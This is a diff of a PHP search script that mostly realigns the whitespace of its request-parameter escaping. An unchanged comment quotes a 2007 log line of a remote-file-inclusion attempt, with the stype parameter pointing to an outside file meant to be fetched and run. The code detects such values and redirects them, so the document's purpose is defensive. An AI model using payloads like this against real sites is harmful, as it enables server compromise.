@@ -157,28 +157,28 @@ function WildCardQuery($stype, $Like, $query) {
 	$orderbyupdown		= ORDERBYASCENDING;
 	$output_format      = OUTPUT_FORMAT_HTML;
 	$minimal_output     = 0;
-	
+
 	// avoid nasty problems by adding slashes
-	if (IsSet($_REQUEST['query']))           $query				= pg_escape_string(trim($_REQUEST['query']));
-	if (IsSet($_REQUEST['stype']))           $stype				= pg_escape_string(trim($_REQUEST['stype']));
-	if (IsSet($_REQUEST['num']))             $num   		    = intval(pg_escape_string(trim($_REQUEST['num'])));
-	if (IsSet($_REQUEST['category']))        $category			= pg_escape_string(trim($_REQUEST['category']));
-	if (IsSet($_REQUEST['port']))            $port				= pg_escape_string(trim($_REQUEST['port']));
-	if (IsSet($_REQUEST['method']))          $method			= pg_escape_string(trim($_REQUEST['method']));
-	if (IsSet($_REQUEST['deleted']))         $deleted			= pg_escape_string(trim($_REQUEST['deleted']));
-	if (!IsSet($_REQUEST[INCLUDE_SRC_COMMITS])) $include_src_commits	= '';
-	if (IsSet($_REQUEST['casesensitivity'])) $casesensitivity	= pg_escape_string(trim($_REQUEST['casesensitivity']));
-	if (IsSet($_REQUEST['orderby']))         $orderby			= pg_escape_string(trim($_REQUEST['orderby']));
-	if (IsSet($_REQUEST['orderbyupdown']))   $orderbyupdown		= pg_escape_string(trim($_REQUEST['orderbyupdown']));
-	if (IsSet($_REQUEST['format']))          $output_format           = pg_escape_string(trim($_REQUEST['format']));
-	if (IsSet($_REQUEST['minimal']))         $minimal_output          = pg_escape_string(trim($_REQUEST['minimal']));
-	
+	if (IsSet($_REQUEST['query']))              $query               = pg_escape_string(trim($_REQUEST['query']));
+	if (IsSet($_REQUEST['stype']))              $stype               = pg_escape_string(trim($_REQUEST['stype']));
+	if (IsSet($_REQUEST['num']))                $num                 = intval(pg_escape_string(trim($_REQUEST['num'])));
+	if (IsSet($_REQUEST['category']))           $category            = pg_escape_string(trim($_REQUEST['category']));
+	if (IsSet($_REQUEST['port']))               $port                = pg_escape_string(trim($_REQUEST['port']));
+	if (IsSet($_REQUEST['method']))             $method              = pg_escape_string(trim($_REQUEST['method']));
+	if (IsSet($_REQUEST['deleted']))            $deleted		 = pg_escape_string(trim($_REQUEST['deleted']));
+	if (!IsSet($_REQUEST[INCLUDE_SRC_COMMITS])) $include_src_commits = '';
+	if (IsSet($_REQUEST['casesensitivity']))    $casesensitivity	 = pg_escape_string(trim($_REQUEST['casesensitivity']));
+	if (IsSet($_REQUEST['orderby']))            $orderby		 = pg_escape_string(trim($_REQUEST['orderby']));
+	if (IsSet($_REQUEST['orderbyupdown']))      $orderbyupdown       = pg_escape_string(trim($_REQUEST['orderbyupdown']));
+	if (IsSet($_REQUEST['format']))             $output_format       = pg_escape_string(trim($_REQUEST['format']));
+	if (IsSet($_REQUEST['minimal']))            $minimal_output      = pg_escape_string(trim($_REQUEST['minimal']));
+
 	# we have a problem with people doing this:
 	#
 	# 83.85.93.90 - - [02/Oct/2007:04:18:00 -0400] "GET /search.php?stype=http://amyru.h18.ru/images/cs.txt? HTTP/1.1" 301 332 "-" "Wget/1.1 (compatible; i486; Linux; RedHat7.3)"
 	# well, it's not so much a problem as an annoyance.  So we will redirect their ass eslewhere.
 	#
-	
+
 	if (substr($stype, 0, 7) === 'http://') {
 	  # redirect their ass
 	  header('Location: http://news.freshports.org/2007/10/02/odd-way-to-break-in/');
